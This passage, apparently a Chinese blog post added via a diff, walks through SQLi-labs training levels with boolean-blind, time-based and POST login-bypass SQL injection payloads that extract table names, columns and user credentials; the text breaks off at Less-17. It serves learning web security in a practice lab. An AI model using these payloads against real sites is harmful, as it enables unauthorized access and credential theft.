+<p>获取表名（先长度=6）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">')) and ascii(substr((select table_name from information_schema.tables where table_schema='</span><span class="k">security</span><span class="s1">' limit 0,1),1,1))=101--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>然后再注入出第一位，后面继续，直到注出来为止。（emails,referers,uagents,users）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">')) and (select count(column_name) from information_schema.columns where table_name='</span><span class="n">users</span><span class="s1">')=3--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>获取字段名（一共3个字段）。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">')) and ascii(substr((select column_name from information_schema.columns where table_name='</span><span class="n">users</span><span class="s1">' limit 0,1),1,1))=105--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>挨个字母进行测试。（最后是id,username,password）</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">')) and ascii(substr((select username from users limit 0,1),1,1))=68--+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>获取数据（结果：1: Dumb:Dumb）</p>
+
+<h3 id="less-8布尔盲注原理">Less-8(布尔盲注原理)</h3>
+
+<p><strong>第一步：找闭合（单引号）</strong>     首先确定闭合</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and 1=1 --+  页面正常 (You are in...)
+?id=1'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span> <span class="c1">--+  页面不正常 (没内容)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>第二步：猜数据库长度</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and length(database())&gt;5 --+  正常（说明&gt;5）
+?id=1'</span> <span class="k">and</span> <span class="k">length</span><span class="p">(</span><span class="k">database</span><span class="p">())</span><span class="o">&gt;</span><span class="mi">10</span> <span class="c1">--+ 不显示（说明≤10）</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and length(database())=8 --+  正常（说明=8）
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>第三步：猜数据库名字符（ASCII码）</strong></p>
+
+<ul>
+  <li>
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+   <span class="err">↑</span>         <span class="err">↑</span>     <span class="err">↑</span>  <span class="err">↑</span>
+<span class="err">截取字符串</span> <span class="err">数据库名</span> <span class="err">从第</span><span class="mi">1</span><span class="err">个字符</span> <span class="err">取</span><span class="mi">1</span><span class="err">个</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">ascii</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)</span> <span class="o">=</span> <span class="mi">97</span> <span class="c1">-- ascii()把字符转成数字</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 第一个字符</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and ascii(substr(database(),1,1))&gt;100 --+  正常
+?id=1'</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">110</span> <span class="c1">--+  不显示</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and ascii(substr(database(),1,1))=115 --+  正常 → 115是'</span><span class="n">s</span><span class="s1">'
+
+-- 第二个字符
+?id=1'</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">101</span> <span class="c1">--+  正常 → 101是'e'</span>
+
+<span class="err">以此类推，拼出：</span><span class="k">security</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>第四步：试出表名</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="rouge-code"><pre><span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span>
+     <span class="err">↑</span>
+<span class="err">这个表存着所有数据库的表信息</span>
+
+<span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'security'</span>
+     <span class="err">↑</span>
+<span class="err">只拿</span><span class="k">security</span><span class="err">数据库的表</span>
+
+<span class="k">select</span> <span class="k">table_name</span>
+     <span class="err">↑</span>
+<span class="err">只要表名这一列</span>
+
+<span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+   <span class="err">↑</span>  <span class="err">↑</span>
+<span class="err">从第</span><span class="mi">0</span><span class="err">个开始</span> <span class="err">拿</span><span class="mi">1</span><span class="err">个（就是第一个表）</span>
+
+<span class="c1">-- 合起来</span>
+<span class="p">(</span><span class="k">select</span> <span class="k">table_name</span> 
+ <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> 
+ <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'security'</span> 
+ <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>翻译成人话</strong>：”从系统的表信息里，找到security数据库的第一个表名”</p>
+
+<p><strong>获取表名长度</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 问：第一个表名的长度是多少？</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and length(
+    (select table_name 
+     from information_schema.tables 
+     where table_schema='</span><span class="k">security</span><span class="s1">' 
+     limit 0,1)
+) = 6 --+
+  ↑
+等于6吗？
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>获取表名字符</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 问：第一个表名的第一个字符是'e'吗？</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and ascii(substr(
+    (select table_name 
+     from information_schema.tables 
+     where table_schema='</span><span class="k">security</span><span class="s1">' 
+     limit 0,1)
+,1,1)) = 101 --+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 1. 先数一下有几个表</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and (select count(table_name) from information_schema.tables where table_schema='</span><span class="k">security</span><span class="s1">')=4 --+
+-- 页面正常，说明有4个表
+
+-- 2. 试第一个表的长度
+?id=1'</span> <span class="k">and</span> <span class="k">length</span><span class="p">((</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'security'</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">6</span> <span class="c1">--+</span>
+<span class="c1">-- 页面正常，第一个表名长度=6（是"emails"）</span>
+
+<span class="c1">-- 3. 试第一个表的第一个字符</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and ascii(substr((select table_name from information_schema.tables where table_schema='</span><span class="k">security</span><span class="s1">' limit 0,1),1,1))=101 --+
+-- 101='</span><span class="n">e</span><span class="s1">'，正常，第一个字符是e
+
+-- 4. 第二个字符...
+?id=1'</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'security'</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">109</span> <span class="c1">--+</span>
+<span class="c1">-- 109='m'，正常</span>
+
+<span class="c1">-- 最终拼出：emails</span>
+<span class="c1">-- 然后继续limit 1,1拿第二个表：referers...</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>第五步：试出字段名</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 1. 先数users表有几个字段</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and (select count(column_name) from information_schema.columns where table_name='</span><span class="n">users</span><span class="s1">')=3 --+
+-- 正常，有3个字段
+
+-- 2. 试第一个字段的长度
+?id=1'</span> <span class="k">and</span> <span class="k">length</span><span class="p">((</span><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'users'</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">2</span> <span class="c1">--+</span>
+<span class="c1">-- 正常，第一个字段长度=2（是"id"）</span>
+
+<span class="c1">-- 3. 试第一个字段的第一个字符</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and ascii(substr((select column_name from information_schema.columns where table_name='</span><span class="n">users</span><span class="s1">' limit 0,1),1,1))=105 --+
+-- 105='</span><span class="n">i</span><span class="s1">'，正常
+
+-- 4. 第二个字段...
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>第三步：试出数据（最慢的部分）</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="p">(</span><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">users</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">from</span> <span class="n">users</span>
+  <span class="err">↑</span>
+<span class="err">从</span><span class="n">users</span><span class="err">表</span>
+
+<span class="k">select</span> <span class="n">username</span>
+     <span class="err">↑</span>
+<span class="err">拿</span><span class="n">username</span><span class="err">这一列</span>
+
+<span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+     <span class="err">↑</span>
+<span class="err">第一条数据</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre><span class="c1">-- 1. 先数有几条数据</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and (select count(*) from users)=13 --+
+-- 正常，13条
+
+-- 2. 试第一条数据的用户名长度
+?id=1'</span> <span class="k">and</span> <span class="k">length</span><span class="p">((</span><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">users</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">4</span> <span class="c1">--+</span>
+<span class="c1">-- 正常，第一个用户名"Dumb"长度=4</span>
+
+<span class="c1">-- 3. 试第一个用户名的第一个字符</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and ascii(substr((select username from users limit 0,1),1,1))=68 --+
+-- 68='</span><span class="n">D</span><span class="s1">'，正常
+
+-- 4. 试第一个用户名的第二个字符...
+?id=1'</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">users</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">117</span> <span class="c1">--+</span>
+<span class="c1">-- 117='u'，正常</span>
+
+<span class="c1">-- 5. 试出用户名后，试密码...</span>
+<span class="c1">-- 6. 然后第二条数据...</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="less-9less-10时间盲注">Less-9、Less-10(时间盲注)</h3>
+
+<p><strong>Less-9</strong></p>
+
+<ul>
+  <li>其实就是布尔盲注外面套了个<code class="language-plaintext highlighter-rouge">if(xxx, sleep, 1)</code></li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="err">布尔盲注</span>
+<span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">115</span>
+     <span class="err">↑</span>
+   <span class="err">条件成立</span> <span class="err">→</span> <span class="err">页面正常</span>
+   <span class="err">条件不成立</span> <span class="err">→</span> <span class="err">页面空白</span>
+<span class="err">时间盲注</span>
+<span class="k">and</span> <span class="n">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">115</span><span class="p">,</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span>
+     <span class="err">↑</span>                                    <span class="err">↑</span>         <span class="err">↑</span>
+   <span class="err">条件成立？</span>                         <span class="err">是→睡</span><span class="mi">5</span><span class="err">秒</span> <span class="err">否→立即返回</span><span class="mi">1</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>注意测试闭合也要用<code class="language-plaintext highlighter-rouge">if(xxx, sleep, 1)</code></strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1">--+</span>
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and sleep(5) --+
+?id=1" and sleep(5) --+
+?id=1) and sleep(5) --+
+?id=1'</span><span class="p">))</span> <span class="k">and</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1">--+</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre></td><td class="rouge-code"><pre><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and if(1=1,sleep(5),1)--+
+判断参数构造。
+?id=1'</span><span class="k">and</span> <span class="n">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span> <span class="k">database</span><span class="p">()))</span><span class="o">&gt;</span><span class="mi">9</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+</span>
+<span class="err">判断数据库名长度</span>
+
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
+逐一判断数据库字符
+?id=1'</span><span class="k">and</span> <span class="n">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()))</span><span class="o">&gt;</span><span class="mi">13</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+</span>
+<span class="err">判断所有表名长度</span>
+
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+
+逐一判断表名
+?id=1'</span><span class="k">and</span> <span class="n">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span> <span class="k">and</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'users'</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">20</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+</span>
+<span class="err">判断所有字段名的长度</span>
+
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="n">users</span><span class="s1">'),1,1))&gt;99,sleep(5),1)--+
+逐一判断字段名。
+?id=1'</span> <span class="k">and</span> <span class="n">if</span><span class="p">(</span><span class="k">length</span><span class="p">((</span><span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">from</span> <span class="n">users</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">109</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+</span>
+<span class="err">判断字段内容长度</span>
+
+<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">' and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+
+逐一检测内容。
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Lesss-10</strong>     和第九关一样只需要将单引号换成双引号。</p>
+
+<h3 id="less-11post注入">Less-11(POST注入)</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">#</code>和<code class="language-plaintext highlighter-rouge">--+</code>使用场景</strong></p>
+
+<ul>
+  <li>
+    <p>在POST请求中（表单数据），``+<code class="language-plaintext highlighter-rouge"> 就是 </code>+<code class="language-plaintext highlighter-rouge"> → </code>–+` → 注释不生效。</p>
+  </li>
+  <li>
+    <p>在POST中用 <code class="language-plaintext highlighter-rouge">#</code>，<code class="language-plaintext highlighter-rouge">#</code> 不需要空格，直接生效。</p>
+  </li>
+</ul>
+
+<p><strong>不过，在URL中（GET请求），<code class="language-plaintext highlighter-rouge">--+</code> 比敲 <code class="language-plaintext highlighter-rouge">#</code> 简单，不用考虑编码</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">#</code> 在URL中是<strong>锚点标记</strong></li>
+  <li>浏览器会把 <code class="language-plaintext highlighter-rouge">#</code> 后面的内容<strong>不发送给服务器</strong>！</li>
+</ul>
+
+<p><em>举个例子</em></p>
+
+<p>你输入：</p>
+
+<pre><code class="language-txt">http://site.com/?id=1' #
+</code></pre>
+
+<p>浏览器只发送：</p>
+
+<pre><code class="language-txt">http://site.com/?id=1'
+</code></pre>
+
+<p><code class="language-plaintext highlighter-rouge">#</code> 后面的内容丢了！</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>场景</th>
+      <th>推荐注释</th>
+      <th>原因</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>GET请求（地址栏）</td>
+      <td><code class="language-plaintext highlighter-rouge">--+</code></td>
+      <td><code class="language-plaintext highlighter-rouge">#</code>会被浏览器截断</td>
+    </tr>
+    <tr>
+      <td>POST请求（表单）</td>
+      <td><code class="language-plaintext highlighter-rouge">#</code></td>
+      <td><code class="language-plaintext highlighter-rouge">--+</code>的<code class="language-plaintext highlighter-rouge">+</code>不会转成空格</td>
+    </tr>
+    <tr>
+      <td>用Burp/sqlmap</td>
+      <td>随便</td>
+      <td>工具会自动处理</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>POST登录不用输密码就能登录</strong></p>
+
+<p>后台SQL原本样子：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'$uname'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">'$passwd'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>SQL注入后：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="n">username</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="o">#</span><span class="s1">' AND password=</span><span class="se">''</span><span class="s1">
+                        ↑
+                       #注释符让后面的代码失效
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">1=1</code> 永远为真，所以整个条件永远为真，返回<strong>所有用户</strong>！</p>
+
+<p><strong>Less-11</strong></p>
+
+<p>首先验证闭合。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="n">Username</span><span class="p">:</span> <span class="mi">1</span><span class="s1">' or 1=1#
+Password:
+回显：Dumb/Dumb
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>单引号闭合<code class="language-plaintext highlighter-rouge">'</code>，然后<code class="language-plaintext highlighter-rouge">union select</code>查询，剩下的就与第一关一样了。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="n">Username</span><span class="p">:</span> <span class="o">-</span><span class="mi">1</span><span class="s1">' union select 1,database()--+
+Password:
+回显：1/security
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="less-12less-13less-14闭合">Less-12、Less-13、Less-14(闭合)</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>关卡</th>
+      <th>闭合</th>
+      <th>万能密码</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>第11关</td>
+      <td><code class="language-plaintext highlighter-rouge">'</code></td>
+      <td><code class="language-plaintext highlighter-rouge">admin' or 1=1#</code></td>
+    </tr>
+    <tr>
+      <td>第12关</td>
+      <td><code class="language-plaintext highlighter-rouge">")</code></td>
+      <td><code class="language-plaintext highlighter-rouge">admin") or 1=1#</code></td>
+    </tr>
+    <tr>
+      <td>第13关</td>
+      <td><code class="language-plaintext highlighter-rouge">')</code></td>
+      <td><code class="language-plaintext highlighter-rouge">admin') or 1=1#</code></td>
+    </tr>
+    <tr>
+      <td>第14关</td>
+      <td><code class="language-plaintext highlighter-rouge">"</code></td>
+      <td><code class="language-plaintext highlighter-rouge">admin" or 1=1#</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="less-15less-16布尔盲注">Less-15、Less-16(布尔盲注)</h3>
+
+<p>不产生报错信息，明显的布尔盲注。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="n">Username</span><span class="p">:</span> <span class="mi">1</span><span class="s1">' or 1=1#
+Password:
+回显：success
+---
+Username: 1'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="o">#</span>
+<span class="n">Password</span><span class="p">:</span>
+<span class="err">回显：</span><span class="n">failed</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Less-15闭合是<code class="language-plaintext highlighter-rouge">'</code>，less-16闭合是<code class="language-plaintext highlighter-rouge">")</code>。其他正常盲注即可。</p>
+
+<h3 id="less-17密码重置">Less-17(密码重置)</h3>
+
+<p><strong>寻找注入点</strong></p>
+
+<p><strong>方法一：</strong></p>
+
+<p>输入<code class="language-plaintext highlighter-rouge">'</code>观察报错。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="err">用户名</span><span class="p">:</span> <span class="k">admin</span><span class="s1">'
+密码: 1
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>如果报错在用户名→ 说明用户名在WHERE子句（后面）</p>
+
+<p>如果报错在密码→ 说明密码在SET子句（前面）</p>
+
+<p><strong>方法二：</strong></p>
+
+<p>先试用户名注入：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
